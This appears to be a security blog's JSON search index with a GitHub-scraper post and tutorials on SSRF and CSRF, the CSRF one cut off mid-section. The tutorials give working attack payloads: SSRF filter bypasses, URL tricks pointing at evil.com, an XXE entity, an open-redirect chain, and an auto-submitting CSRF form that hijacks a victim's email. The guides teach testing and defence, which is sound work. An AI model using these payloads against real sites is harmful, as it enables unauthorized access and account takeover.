[
  
  {
    "title": "Github Scraper",
    "url": "/posts/python-github-scraper",
    "categories": "Python, Github Scraper",
    "tags": "Python, Github Scraper",
    "date": "2025-02-25 00:00:00 +0000",
    





    
    "snippet": "Tool designed to scrape and analyze repositories from GitHub based on customizable search criteria.Github Scraper Repository  Link: Github Scraper RepositoryFeatures  Customizable Search: Filter re...",
    "content": "Tool designed to scrape and analyze repositories from GitHub based on customizable search criteria.Github Scraper Repository  Link: Github Scraper RepositoryFeatures  Customizable Search: Filter repositories by programming language, associated tools/technologies (e.g., Docker, React, TensorFlow), and star ratings.  Date Filtering: Retrieve repositories updated within a specific time range (e.g., last 6 months, 1 year).  Rate Limit Handling: Automatically handles GitHub API rate limits to ensure uninterrupted scraping.  CLI and GUI Interfaces: Offers both command-line and graphical user interfaces for flexibility.  Metadata Extraction: Fetches repository metadata, including the latest commit date, owner details, and more.  Retry Mechanism: Implements retry logic for failed API requests, ensuring robustness.How It WorksThe GitHub Scanner uses the GitHub REST API to query repositories based on user-defined parameters. Here’s a step-by-step breakdown of its operation:  Input Parameters: The user specifies search criteria such as programming language, tools, star range, and date range.  API Requests: The tool sends requests to the GitHub API to fetch matching repositories.  Data Processing: Extracts relevant metadata, such as repository name, owner, latest commit date, and star count.  Output: Displays the results in a structured format (e.g., CLI output or GUI table).The scraper also includes a retry mechanism to handle rate limits and transient errors gracefully.Code StructureThe codebase is organized into modular components for maintainability and scalability:  API Interaction:          make_api_request: Handles API calls with retry logic and rate limit management.      check_rate_limit: Fetches and displays the current rate limit status.        Search Functions:          search_repositories: Queries GitHub for repositories based on search criteria.      get_repository_metadata: Retrieves detailed metadata for a specific repository.        Utility Functions:          is_within_date_range: Filters repositories based on the latest commit date.      get_latest_commit_date: Fetches the most recent commit date for a repository.        User Interface:          CLI: Provides a text-based interface for input and output.      GUI: Offers a graphical interface for ease of use.      InterfaceCLI VersionThe CLI version provides a straightforward, text-based interface for users who prefer simplicity and speed. Below is an example of the CLI interface:GUI VersionThe GUI version offers a more interactive experience with dropdown menus, checkboxes, and visual feedback. Users can select programming languages, filter by tools/technologies, specify star ranges, and set date filters through intuitive controls. A progress bar provides real-time updates during the scraping process, while a log area displays clickable links to the discovered repositories.Here’s a preview of the GUI interface:Creating a GitHub TokenTo use the GitHub Scanner, you need to generate a personal access token:  Go to your GitHub Account Settings.  Navigate to Developer Settings → Personal Access Tokens → Tokens (classic).  Click Generate New Token and select Generate New Token (classic).  Select the necessary scopes (e.g., repo, read:org).  Copy the generated token and paste it into the script where indicated (YOUR_GITHUB_TOKEN_HERE).Limitations  Rate Limits: GitHub imposes strict rate limits on unauthenticated and authenticated API requests. While the scraper handles these limits, excessive queries may still lead to temporary blocks.  Search Complexity: Complex queries with multiple filters may take longer to process due to API constraints.  Data Completeness: The scraper relies on GitHub’s API, which may not expose all repository details.Future Enhancements  Advanced Filters: Add support for filtering by license type, repository size, or contributor count.  Export Options: Allow users to export results in various formats (e.g., CSV, JSON, Excel).  Parallel Processing: Implement multi-threading to speed up large-scale queries.  Web Interface: Develop a web-based dashboard for remote access and collaboration.  Machine Learning Integration: Use ML models to recommend repositories based on user preferences.Ethical Considerations  Respect Rate Limits: Always adhere to GitHub’s API usage policies to avoid overloading their servers.  Data Privacy: Ensure that scraped data is used responsibly and does not violate any privacy agreements.  Attribution: Properly credit repository owners when using their data for research or analysis.Tips and Tricks  Optimize Queries: Use specific keywords and filters to narrow down results and reduce API calls.  Monitor Rate Limits: Regularly check your rate limit status to avoid unexpected interruptions.  Use Tokens Wisely: Authenticate with a personal access token to increase your rate limit allowance.  Batch Processing: For large datasets, consider breaking queries into smaller batches to stay within rate limits.Extra Insights  The scraper supports multiple programming languages and tools, making it versatile for various use cases.  By analyzing the latest commit dates, users can identify actively maintained repositories.  Combining star ratings with other filters helps prioritize high-quality projects."
  },
  
  {
    "title": "Server-Side Request Forgery (SSRF)",
    "url": "/posts/ssrf-guide",
    "categories": "Guides, Web Pentesting",
    "tags": "Guides, SSRF, Web Pentesting",
    "date": "2025-02-23 00:00:00 +0000",
    





    
    "snippet": "Understanding Server-Side Request Forgery (SSRF)What is SSRF?Server-Side Request Forgery (SSRF) is a critical web security vulnerability that allows an attacker to induce a server-side application ...",
    "content": "Understanding Server-Side Request Forgery (SSRF)What is SSRF?Server-Side Request Forgery (SSRF) is a critical web security vulnerability that allows an attacker to induce a server-side application to make unintended HTTP requests to internal or external systems. This can lead to unauthorized access to sensitive data, internal services, or even remote code execution on the server.In a typical SSRF attack:  The attacker may cause the server to connect to internal-only services within the organization’s infrastructure.  Alternatively, they might force the server to connect to arbitrary external systems, potentially leaking sensitive data such as authorization credentials.What is the Impact of SSRF Attacks?A successful SSRF attack can have severe consequences, including:  Unauthorized Actions: Performing actions or accessing data within the vulnerable application without proper authorization.  Access to Back-End Systems: Gaining access to other systems that the application communicates with, such as databases, internal APIs, or administrative interfaces.  Arbitrary Command Execution: In some cases, SSRF can lead to full control over the server by exploiting vulnerabilities in back-end services.If the SSRF exploit results in connections to external third-party systems, it could lead to malicious onward attacks that appear to originate from the organization hosting the vulnerable application. This can damage the organization’s reputation and expose it to legal liabilities.Common SSRF Attack ScenariosSSRF attacks often exploit trust relationships to escalate an attack from the vulnerable application and perform unauthorized actions. These trust relationships may exist in relation to:  The Server Itself: The server may trust requests originating from itself (e.g., localhost or 127.0.0.1) and bypass normal access controls.  Other Back-End Systems: Internal systems within the same organization may trust requests coming from the application server, especially if they share the same network.SSRF Attacks Against the ServerOne of the most common SSRF attack vectors involves targeting the server itself. In this scenario, the attacker causes the application to make an HTTP request back to the server hosting the application via its loopback network interface. This typically involves supplying a URL with a hostname like:  127.0.0.1 (a reserved IP address pointing to the loopback adapter).  localhost (a commonly used name for the same adapter).Example Scenario: Stock Checker ApplicationImagine a shopping application that lets users check whether an item is in stock at a specific store. To provide this information, the application queries various back-end REST APIs by passing the URL to the relevant API endpoint via a front-end HTTP request.Here’s how a normal request looks:POST /product/stock HTTP/1.0Content-Type: application/x-www-form-urlencodedContent-Length: 118stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1The server processes this request, retrieves the stock status, and returns it to the user.Exploiting the VulnerabilityAn attacker can modify the request to specify a URL local to the server:POST /product/stock HTTP/1.0Content-Type: application/x-www-form-urlencodedContent-Length: 118stockApi=http://localhost/admin     # or maybe http://127.0.0.1/adminThe server fetches the contents of the /admin URL and returns it to the user. Normally, the /admin functionality is only accessible to authenticated users. However, if the request originates from the local machine, normal access controls are bypassed, granting full access to the administrative functionality because the request appears to come from a trusted location.Why Do Applications Trust Local Requests?Applications often behave this way due to several reasons:  Access Control Check Bypass:          The access control check might be implemented in a different component that sits in front of the application server. When a connection is made back to the server, the check is bypassed.        Disaster Recovery Mechanisms:          For disaster recovery purposes, the application might allow administrative access without logging in to any user coming from the local machine. This provides a way for administrators to recover the system if they lose their credentials, assuming only fully trusted users would come directly from the server.        Different Ports for Administrative Interfaces:          The administrative interface might listen on a different port number than the main application, making it unreachable directly by users.      These types of trust relationships, where requests originating from the local machine are handled differently than ordinary requests, often turn SSRF into a critical vulnerability.Understanding Server-Side Request Forgery (SSRF)SSRF Attacks Against Other Back-End SystemsIn some cases, the application server is capable of interacting with back-end systems that are not directly accessible to external users. These back-end systems often have non-routable private IP addresses (e.g., 192.168.x.x, 10.x.x.x, or 172.16.x.x).These systems are typically protected by the network topology, meaning they are only accessible from within the internal network. As a result, they often have a weaker security posture compared to systems exposed to the internet. In many cases, these internal back-end systems contain sensitive functionality that can be accessed without authentication by anyone who can interact with them.Example Scenario: Accessing an Internal Administrative InterfaceContinuing from the previous example, imagine there is an administrative interface hosted on a back-end system at the URL http://192.168.0.68/admin. This interface is not directly reachable by external users because it resides within the internal network and is protected by the network’s architecture.However, due to an SSRF vulnerability, an attacker can exploit the application server to access this administrative interface indirectly. The attacker can submit the following request to exploit the SSRF vulnerability:POST /product/stock HTTP/1.0Content-Type: application/x-www-form-urlencodedContent-Length: 118stockApi=http://192.168.0.68/adminHow the Attack Works  Exploiting the SSRF Vulnerability:          The attacker modifies the stockApi parameter in the request to point to the internal back-end system (http://192.168.0.68/admin).      The vulnerable application server processes the request and makes an HTTP request to the specified internal URL.        Accessing Sensitive Functionality:          Since the request originates from the application server, which is part of the internal network, the back-end system treats it as a trusted request.      The administrative interface at http://192.168.0.68/admin may allow access without requiring authentication, assuming that only trusted internal systems would be able to reach it.      The attacker gains unauthorized access to the administrative interface, potentially allowing them to perform sensitive actions such as modifying configurations, accessing sensitive data, or even taking control of the system.      Why Are Internal Systems Vulnerable?Internal systems are often more vulnerable for several reasons:  Weaker Security Posture:          Since these systems are not directly exposed to the internet, they are often assumed to be safe from external attacks. As a result, they may lack robust security measures such as strong authentication mechanisms or input validation.        Trust Relationships:          Internal systems often trust requests coming from other internal systems, especially if they originate from the same network or application server. This trust can be exploited via SSRF to bypass access controls.        Non-Routable IP Addresses:          Internal systems typically use private IP ranges (e.g., 192.168.x.x, 10.x.x.x, etc.), which are not routable over the public internet. However, an SSRF vulnerability allows attackers to “pivot” through the application server to reach these internal systems.        Sensitive Functionality:          Many internal systems host sensitive functionality, such as administrative interfaces, monitoring tools, or databases, which are often accessible without authentication when accessed from within the internal network.      NOTA: To scan an entire internal network (e.g., 192.168.0.x), you can use tools like Burp Intruder to automate the process of checking all possible IP addresses.Circumventing Common SSRF DefensesIt is common for applications to exhibit SSRF behavior while also implementing defenses aimed at preventing malicious exploitation. However, these defenses are often insufficient and can be bypassed using various techniques.SSRF with Blacklist-Based Input FiltersSome applications attempt to block input containing sensitive hostnames like 127.0.0.1 or localhost, as well as sensitive URLs such as /admin. Despite these measures, attackers can often circumvent these filters using the following techniques:  Use Alternative IP Representations:          Instead of using 127.0.0.1, try alternative representations of the same IP address, such as:                  Decimal: 2130706433          Octal: 017700000001          Partial: 127.1                      Register a Custom Domain:          Register your own domain name that resolves to 127.0.0.1. For example, you can use tools like spoofed.burpcollaborator.net to create a domain that points back to the loopback interface.        Obfuscate Blocked Strings:          Bypass filters by obfuscating blocked strings using:                  URL encoding: For example, replace localhost with %6c%6f%63%61%6c%68%6f%73%74.          Case variation: Some filters are case-sensitive, so mixing uppercase and lowercase letters (e.g., LoCaLhOsT) may bypass them.                      Redirect Through a Controlled URL:          Provide a URL that you control, which redirects to the target URL. This technique can bypass filters that only check the initial request:                  Use different HTTP redirect codes (e.g., 301, 302, 307).          Switch protocols during the redirect. For example, redirect from an http:// URL to an https:// URL, as some anti-SSRF filters fail to handle protocol changes properly.                    SSRF with Whitelist-Based Input FiltersSome applications only allow inputs that match a whitelist of permitted values. The filter may look for a match at the beginning of the input or within it. You may be able to bypass this filter by exploiting inconsistencies in URL parsing.The URL specification contains several features that are often overlooked when URLs are parsed and validated using ad-hoc methods:  Embed Credentials in a URL:          You can embed credentials in a URL before the hostname, using the @ character. For example:        http://user:pass@trusted-domain.com@evil.com                      Use the # Character for Fragments:          You can use the # character to indicate a URL fragment. For example:        http://trusted-domain.com/#@evil.com                      Leverage DNS Naming Hierarchy:          You can place required input into a fully-qualified DNS name that you control. For example:        http://trusted-domain.evil.com                      URL-Encoding Characters:          You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request. You can also try double-encoding characters; some servers recursively URL-decode the input they receive, which can lead to further discrepancies.        Combine Techniques:          You can use combinations of these techniques together.      Bypassing SSRF Filters via Open RedirectionIt is sometimes possible to bypass filter-based defenses by exploiting an open redirection vulnerability.In the previous example, imagine the user-submitted URL is strictly validated to prevent malicious exploitation of the SSRF behavior. However, the application whose URLs are allowed contains an open redirection vulnerability. Provided the API used to make the back-end HTTP request supports redirections, you can construct a URL that satisfies the filter and results in a redirected request to the desired back-end target.For example, the application contains an open redirection vulnerability in which the following URL:/product/nextProduct?currentProductId=6&amp;path=http://evil-user.netreturns a redirection to:http://192.168.0.68/adminYou can leverage the open redirection vulnerability to bypass the URL filter and exploit the SSRF vulnerability as follows:POST /product/stock HTTP/1.0Content-Type: application/x-www-form-urlencodedContent-Length: 118stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&amp;path=http://192.168.0.68/adminThis SSRF exploit works because:  The application first validates that the supplied stockAPI URL is on an allowed domain, which it is.  The application then requests the supplied URL, which triggers the open redirection.  It follows the redirection and makes a request to the internal URL of the attacker’s choosing (http://192.168.0.68/admin).Blind SSRF VulnerabilitiesBlind SSRF vulnerabilities occur when an application is induced to issue a back-end HTTP request to a supplied URL, but the response from that back-end request is not returned in the application’s front-end response. Unlike traditional SSRF vulnerabilities, where attackers can directly observe the results of their actions, blind SSRF operates in a “one-way” manner, making it more challenging to exploit.While blind SSRF is harder to detect and exploit compared to traditional SSRF, it can sometimes lead to severe consequences, such as full remote code execution on the server or other back-end components.What is the Impact of Blind SSRF Vulnerabilities?The impact of blind SSRF vulnerabilities is generally lower than that of fully informed SSRF vulnerabilities due to their one-way nature. Since the attacker cannot directly retrieve sensitive data from back-end systems, exploitation becomes more difficult. However, in certain scenarios, blind SSRF can still be leveraged to achieve critical outcomes, such as:  Probing internal systems: Attackers can use blind SSRF to scan internal networks and identify vulnerable services.  Remote code execution: If the attacker can exploit a vulnerability in the server’s HTTP implementation or other back-end components, they may gain full control over the system.How to Find and Exploit Blind SSRF VulnerabilitiesUsing Out-of-Band (OAST) TechniquesThe most reliable way to detect blind SSRF vulnerabilities is by using out-of-band (OAST) techniques. These techniques involve triggering an HTTP request to an external system controlled by the attacker and monitoring for any network interactions with that system.Leveraging Burp Collaborator and AlternativesThe easiest and most effective way to implement out-of-band techniques is by using Burp Collaborator, a tool designed for detecting out-of-band interactions. However, there are several alternatives to Burp Collaborator that you can use, depending on your needs:  Interact.sh:          Description: The best alternative that doesn’t require hosting yourself is Interact.sh. It is widely used and highly reliable. However, some targets may block outbound traffic to its domain, so it’s good to have backups or set up your own server using the instructions on the Interact.sh GitHub.      Website: https://app.interactsh.com/#/        Webhook.site:          Description: A simple and user-friendly tool for capturing HTTP requests. It provides a unique URL that you can use to monitor incoming requests.      Website: https://webhook.site/        Pingb.in:          Description: Another lightweight tool for capturing HTTP requests. It allows you to generate a unique endpoint and view incoming requests in real-time.      Website: http://pingb.in/        RequestBin:          Description: A popular tool for inspecting HTTP requests. It provides a temporary endpoint where you can monitor incoming requests.      Website: https://requestbin.net/        Beeceptor:          Description: Beeceptor allows you to create mock APIs and inspect incoming HTTP requests. It’s useful for testing SSRF vulnerabilities and other scenarios where you need to monitor traffic.      Website: https://beeceptor.com/        Self-Hosted Options:          If you prefer to host your own OAST server, here are some tools you can use:                  Interact.sh Self-Hosted          Malidate: https://github.com/redfast00/malidate          DNSBin: https://github.com/ettic-team/dnsbin          DNSObserver: https://github.com/allyomalley/dnsobserver                    Observing DNS Lookups Without HTTP RequestsIt is common during testing to observe a DNS lookup for the supplied domain but no subsequent HTTP request. This typically happens because:  The application attempted to make an HTTP request to the domain, triggering the initial DNS lookup.  The actual HTTP request was blocked by network-level filtering (e.g., firewalls or proxies).  Many infrastructures allow outbound DNS traffic since it is required for various purposes but restrict HTTP connections to unexpected destinations.Exploiting Blind SSRF VulnerabilitiesProbing Internal SystemsSimply identifying a blind SSRF vulnerability that triggers out-of-band HTTP requests does not immediately provide a route to exploitation. Since the attacker cannot view the response from the back-end request, they cannot use this behavior to explore content on reachable systems. However, blind SSRF can still be leveraged to:  Scan Internal Networks:          Attackers can blindly sweep the internal IP address space, sending payloads designed to detect well-known vulnerabilities. For example, payloads targeting unpatched services like Redis, Memcached, or Elasticsearch.        Use Blind Out-of-Band Techniques:          Payloads that employ blind out-of-band techniques can help uncover critical vulnerabilities on internal servers that are not patched or properly secured.      Inducing Malicious ResponsesAnother avenue for exploiting blind SSRF vulnerabilities is to induce the application to connect to a system under the attacker’s control and return malicious responses to the HTTP client that makes the connection. For example:  Exploiting Client-Side Vulnerabilities:          If the attacker can exploit a serious vulnerability in the server’s HTTP implementation (e.g., buffer overflow, deserialization flaws), they might achieve remote code execution within the application infrastructure.        Delivering Malicious Payloads:          By controlling the response sent to the application server, attackers can attempt to exploit vulnerabilities in how the server processes incoming data.      Understanding Server-Side Request Forgery (SSRF)Hidden Attack Surfaces for SSRF VulnerabilitiesWhile many Server-Side Request Forgery (SSRF) vulnerabilities are relatively easy to identify because they involve request parameters containing full URLs, some SSRF vulnerabilities are more subtle and require deeper investigation to uncover. These hidden attack surfaces often arise from less obvious features of web applications, such as:  URLs Embedded in Data Formats (e.g., XML, JSON).  SSRF via the Referer Header.  Partial URLs in Requests (e.g., hostnames or URL paths).Let’s explore each of these attack surfaces in detail.1. URLs Within Data FormatsSome applications transmit data in formats that allow the inclusion of URLs, which might be requested by the data parser for that format. Two common examples are XML and JSON.Example: SSRF via XML (XXE Injection)      Scenario:    An application accepts user-submitted XML data to process invoices. The XML parser processes external entities, and the application uses the parsed data to fetch resources.        Vulnerable XML Payload:    &lt;!DOCTYPE foo [  &lt;!ENTITY xxe SYSTEM \"http://internal-service/admin\"&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;            What Happens:    The XML parser processes the &amp;xxe; entity and makes a request to http://internal-service/admin. If the application is vulnerable to XXE Injection, this can lead to an SSRF vulnerability, allowing attackers to access internal services or sensitive data.  Example: SSRF via JSON with URL Fields      Scenario:    An application accepts JSON data containing a URL field, which is later used by the server to fetch additional resources.        Vulnerable JSON Payload:    {  \"resource_url\": \"http://192.168.1.1\"}            What Happens:    The server takes the resource_url value and makes a request to it. If no validation is in place, an attacker can supply an internal URL like http://192.168.1.1 or http://localhost, leading to SSRF.  Key Takeaways for URLs in Data Formats  Always validate and sanitize user-supplied data, especially when parsing formats like XML or JSON that may include URLs.  Be cautious of external entity processing in XML parsers, as this can lead to XXE Injection vulnerabilities, which often overlap with SSRF.2. SSRF via the Referer HeaderSome applications use server-side analytics software to track visitors. This software often logs the Referer header in requests to monitor incoming links. In many cases, the analytics software will visit any third-party URLs that appear in the Referer header. This behavior is typically intended to analyze the contents of referring sites, including the anchor text used in incoming links.Example: SSRF via Referer Header      Scenario:    An e-commerce website tracks referrals using server-side analytics. When a user visits a product page, the Referer header is logged and analyzed.        Malicious Referer Header:    Referer: http://internal-service/admin            What Happens:    The analytics software processes the Referer header and attempts to visit the URL http://internal-service/admin. If the analytics software runs on the server and has access to internal systems, this can lead to SSRF.  Example: SSRF via Redirected Referer      Scenario:    The analytics software follows redirects when processing the Referer header.        Malicious Referer Header:    Referer: http://malicious-site.com/redirect            What Happens:    The analytics software visits http://malicious-site.com/redirect, which redirects to http://internal-service/admin. This allows attackers to bypass simple filters and exploit SSRF.  Key Takeaways for SSRF via the Referer Header  Avoid blindly following or logging URLs in the Referer header.  Implement strict filtering for internal or sensitive domains.  Consider disabling or restricting the use of the Referer header if it’s not essential for your application.3. Partial URLs in RequestsIn some cases, an application only places a hostname or part of a URL path into request parameters. The submitted value is then incorporated server-side into a full URL that is requested.Example: SSRF via Hostname Parameter      Scenario:    An application allows users to specify a hostname for fetching weather data.        Vulnerable Request:    GET /weather?host=weather-api.example.com HTTP/1.1Host: vulnerable-app.com            What Happens:    The server constructs a URL like http://weather-api.example.com/data and makes a request to it. An attacker can supply an internal hostname like 192.168.1.1 or localhost:    GET /weather?host=localhost HTTP/1.1Host: vulnerable-app.com            Impact:    The server makes a request to http://localhost/data, potentially exposing sensitive internal services.  Example: SSRF via URL Path Parameter      Scenario:    An application allows users to specify a file path for downloading documents.        Vulnerable Request:    GET /download?file=/public/reports/report.pdf HTTP/1.1Host: vulnerable-app.com            What Happens:    The server constructs a URL like http://file-server.internal/files/public/reports/report.pdf and fetches the file. An attacker can manipulate the file parameter to access restricted files:    GET /download?file=/admin/secrets.txt HTTP/1.1Host: vulnerable-app.com            Impact:    The server fetches http://file-server.internal/files/admin/secrets.txt, potentially leaking sensitive data.  Key Takeaways for Partial URLs in Requests  Validate and restrict user-supplied input to prevent attackers from controlling critical parts of the constructed URL.  Be cautious when allowing users to specify hostnames or file paths, as these can be manipulated to access internal resources or sensitive files.Understanding Server-Side Request Forgery (SSRF)Summary of Key PointsThroughout this guide, we’ve explored Server-Side Request Forgery (SSRF) in depth, covering its definition, impact, common attack scenarios, and various techniques attackers use to exploit it. Here’s a quick recap of the key points:  What is SSRF?          SSRF occurs when an attacker can manipulate a server-side application into making unintended HTTP requests to internal or external systems.      This can lead to unauthorized access to sensitive data, internal services, or even remote code execution.        Impact of SSRF:          SSRF can allow attackers to bypass access controls, access back-end systems, and perform malicious actions such as data exfiltration or service disruption.      If exploited against external systems, it could lead to onward attacks that appear to originate from the vulnerable organization.        Common Attack Scenarios:          Attacks Against the Server: Exploiting trust relationships where the server trusts requests originating from itself (e.g., localhost, 127.0.0.1).      Attacks Against Other Back-End Systems: Accessing internal systems with private IP addresses (192.168.x.x, 10.x.x.x) that are not directly accessible from the internet.        Blind SSRF:          Blind SSRF occurs when the server makes a request to a supplied URL but does not return the response to the attacker.      While harder to exploit, blind SSRF can still be used to probe internal networks or trigger malicious responses.        Hidden Attack Surfaces:          SSRF vulnerabilities can also arise from less obvious sources, such as URLs embedded in data formats (XML, JSON), the Referer header, or partial URLs in requests.      Mitigation Strategies for SSRF VulnerabilitiesTo effectively mitigate SSRF vulnerabilities, it’s crucial to implement a combination of defensive measures. Below are some key strategies and best practices:1. Validate and Sanitize User Input      Whitelisting Allowed Domains: Instead of blocking specific domains or IPs, maintain a whitelist of trusted domains that the application is allowed to make requests to. This approach is more secure than blacklisting, as it prevents attackers from using alternative representations of blocked IPs (e.g., 127.0.0.1 vs. 2130706433).        Input Validation: Ensure that any user-supplied input containing URLs is strictly validated. Reject any input that doesn’t match the expected format or domain.        URL Parsing and Normalization: Use robust URL parsing libraries to normalize and validate URLs. For example, resolve relative paths, decode URL-encoded characters, and ensure that the final URL matches the intended destination.  2. Restrict Outbound Requests      Network-Level Restrictions: Implement firewall rules or network segmentation to restrict outbound requests from the application server. Only allow connections to trusted internal or external systems.        DNS Resolution Control: Prevent the application from resolving internal hostnames or private IP ranges (192.168.x.x, 10.x.x.x, etc.). This can help block attempts to access internal systems.        Disable Unnecessary Protocols: If your application only needs to make HTTP/HTTPS requests, disable other protocols like file://, gopher://, or ftp:// to reduce the attack surface.  3. Implement Strong Authentication and Authorization      Internal System Authentication: Ensure that internal systems require authentication even when accessed from within the internal network. This prevents attackers from exploiting trust relationships between systems.        Least Privilege Principle: Limit the permissions of the application server when accessing internal systems. For example, if the server only needs read-only access to a database, don’t grant it write permissions.  4. Monitor and Log Outbound Requests      Outbound Traffic Monitoring: Regularly monitor outbound traffic from your application server to detect suspicious activity, such as requests to internal IP ranges or unexpected domains.        Logging: Log all outbound requests made by the application, including the destination URL, timestamp, and response status. This can help identify potential SSRF attacks during incident response.  5. Use Security Headers and Tools      Content Security Policy (CSP): Implement a strong Content Security Policy to prevent unauthorized requests to sensitive endpoints. For example, you can block requests to localhost or internal domains.        Web Application Firewalls (WAF): Use a WAF to detect and block malicious requests that may lead to SSRF. Many modern WAFs have built-in rules for detecting SSRF patterns.        Security Testing Tools: Regularly test your application for SSRF vulnerabilities using tools like Burp Suite, OWASP ZAP, or Interact.sh. These tools can help identify hidden attack surfaces and blind SSRF vulnerabilities.  6. Educate Developers and Security Teams      Developer Training: Educate developers about SSRF vulnerabilities and how to avoid introducing them into the codebase. Emphasize the importance of input validation, whitelisting, and secure coding practices.        Security Awareness: Ensure that security teams are aware of SSRF risks and know how to detect and respond to SSRF attacks. Conduct regular security audits and penetration tests to identify and remediate vulnerabilities.  Best Practices for Preventing SSRF VulnerabilitiesHere are some additional best practices to follow when securing your applications against SSRF:      Avoid Using User-Supplied URLs: Whenever possible, avoid allowing users to supply full URLs. Instead, use predefined options or internal logic to construct URLs.        Use Internal DNS Resolvers: Configure your application to use internal DNS resolvers that cannot resolve external or private IP addresses. This can help prevent attackers from accessing internal systems.        Limit Redirects: If your application follows redirects, ensure that it only allows redirects to trusted domains. Disable automatic redirections to untrusted or unknown destinations.        Implement Rate Limiting: Apply rate limiting to outbound requests to prevent attackers from scanning internal networks or performing brute-force attacks.        Regularly Update Dependencies: Keep all third-party libraries and frameworks up to date to patch known vulnerabilities that could be exploited via SSRF.  "
  },
  
  {
    "title": "Cross-Site Request Forgery (CSRF)",
    "url": "/posts/csrf-guide",
    "categories": "Guides, Web Pentesting",
    "tags": "Guides, CSRF, Web Pentesting",
    "date": "2025-02-23 00:00:00 +0000",
    





    
    "snippet": "Introduction to Cross-Site Request Forgery (CSRF)What is Cross-Site Request Forgery (CSRF)?Cross-Site Request Forgery (CSRF) is a web security vulnerability that tricks users into performing action...",
    "content": "Introduction to Cross-Site Request Forgery (CSRF)What is Cross-Site Request Forgery (CSRF)?Cross-Site Request Forgery (CSRF) is a web security vulnerability that tricks users into performing actions they didn’t intend to. It exploits the trust that a website has in a user’s browser, allowing an attacker to perform unauthorized actions on behalf of an authenticated user without their knowledge.CSRF attacks bypass the same-origin policy, which is meant to prevent websites from interfering with each other, by forcing the user to make unintended requests to a site they are already authenticated on. This can lead to actions such as changing account settings, transferring money, or other malicious activities without the user’s consent.How Does CSRF Work?For a CSRF attack to be successful, three key conditions must be met:      A Relevant Action:The attacker must have a reason to induce an action within the application, such as modifying user permissions or changing the user’s password. This action is often privileged or tied to user-specific data.        Cookie-Based Session Handling:The application must rely solely on session cookies to authenticate and identify the user. If the application uses cookies to track the session, the attacker can exploit this to make unauthorized requests on behalf of the user.        No Unpredictable Request Parameters:The action the attacker wants to induce must not require any parameters that are difficult or impossible for the attacker to guess. For example, if an attacker wants to change a user’s password, the function would be vulnerable if the attacker doesn’t need to know the user’s current password.  Example ScenarioConsider an example where an application lets users change their email address. The request to change the email might look like this:POST /email/change HTTP/1.1Host: vulnerable-website.comContent-Type: application/x-www-form-urlencodedContent-Length: 30Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfEemail=wiener@normal-user.comThis scenario meets the conditions for a CSRF attack:      Relevant Action:The attacker is interested in changing the user’s email, which could then lead to further control, such as triggering a password reset and gaining full access to the account.        Cookie-Based Session Handling:The request uses a session cookie to authenticate the user, and the application doesn’t have any other mechanisms, like anti-CSRF tokens, to validate the request. The browser automatically sends the session cookie with the request.        Predictable Parameters:The attacker can easily guess or know the request parameters required for the action (in this case, the new email address), allowing them to craft a malicious request.  Malicious HTML ExampleWith these conditions in place, the attacker can construct a web page containing the following HTML:&lt;form action=\"https://vulnerable-website.com/email/change\" method=\"POST\"&gt;    &lt;input type=\"hidden\" name=\"email\" value=\"pwned@evil-user.net\"&gt;&lt;/form&gt;&lt;script&gt;    document.forms[0].submit();&lt;/script&gt;If a victim user visits the attacker’s web page, the following steps will occur:      Triggering the Request:The attacker’s page will automatically trigger an HTTP request to the vulnerable website (e.g., the email change request).        Automatic Session Inclusion:If the user is already logged in to the vulnerable website, their browser will automatically include the session cookie with the request (assuming the SameSite cookie attribute isn’t in use).        Processing the Request:The vulnerable website will treat the request as if it were made by the victim user, process it normally, and carry out the action, such as changing the email address.  Note: While CSRF is often described in the context of cookie-based session handling, it can also apply in other cases where the application automatically includes user credentials in requests, such as in HTTP Basic authentication or certificate-based authentication. In these scenarios, attackers can exploit the same trust the website places in the user’s credentials to perform unauthorized actions.Constructing and Delivering CSRF AttacksHow to Construct a CSRF AttackManually creating the HTML needed for a CSRF exploit can be cumbersome, especially when the desired request contains a large number of parameters or has quirks in its structure. Fortunately, tools like Burp Suite Professional and other free alternatives make it easier to generate CSRF exploits.Steps to Construct a CSRF Exploit:      Select a Request:In Burp Suite Professional, select any request you want to test or exploit.        Generate CSRF PoC:From the right-click context menu, select Engagement tools / Generate CSRF PoC. Burp Suite will generate HTML that triggers the selected request (minus cookies, which are automatically added by the victim’s browser).        Fine-Tune the Attack:You can tweak various options in the CSRF PoC generator to handle unusual features of the request, such as custom headers or specific parameter formats.        Test the Exploit:Copy the generated HTML into a web page, view it in a browser logged into the vulnerable website, and verify whether the intended request is issued successfully and the desired action occurs.  Free Tools for CSRF ExploitsWhile Burp Suite Professional is a popular tool for generating CSRF exploits, there are free alternatives that work similarly:  CSRFShark: https://csrfshark.github.io/          Simply copy the request from Burp Suite and paste it into CSRFShark, choosing HTTP/HTTPS depending on the website’s restrictions.        Nakanosec CSRF Tool: https://tools.nakanosec.com/csrf/          Another free tool that generates CSRF exploits based on HTTP requests.      Example CSRF Exploit CodeHere’s an example of a simple CSRF exploit using HTML:&lt;form action=\"https://vulnerable-website.com/email/change\" method=\"POST\"&gt;    &lt;input type=\"hidden\" name=\"email\" value=\"pwned@evil-user.net\"&gt;&lt;/form&gt;&lt;script&gt;    document.forms[0].submit();&lt;/script&gt;When a victim visits this page, their browser will automatically submit the form, triggering the malicious request to change their email address.How to Deliver a CSRF ExploitThe delivery mechanisms for CSRF attacks are quite similar to those for reflected XSS attacks. Below are common methods attackers use to deliver CSRF exploits:1. Hosting Malicious HTMLThe attacker hosts the malicious HTML on a website they control. When victims visit the site, their browsers automatically send the malicious request to the vulnerable website.2. Inducing Victims to VisitAttackers encourage victims to visit the malicious website by sending links via email, social media, or embedding the attack in high-traffic websites (e.g., user comment sections).3. Self-Contained GET Method ExploitsSome CSRF exploits use the GET method and can be fully contained within a single URL on the vulnerable website. In these cases, the attacker doesn’t need to rely on an external site and can directly send victims a malicious URL.For example, if changing an email address can be done via a GET request, the exploit might look like this:https://vulnerable-website.com/email/change?email=pwned@evil-user.netWhen the victim visits this URL, their browser sends the malicious request to the vulnerable website.Common Defenses Against CSRFSuccessfully exploiting CSRF vulnerabilities typically requires bypassing anti-CSRF measures. Below are the most common defenses used to protect against CSRF attacks:1. CSRF TokensA CSRF token is a 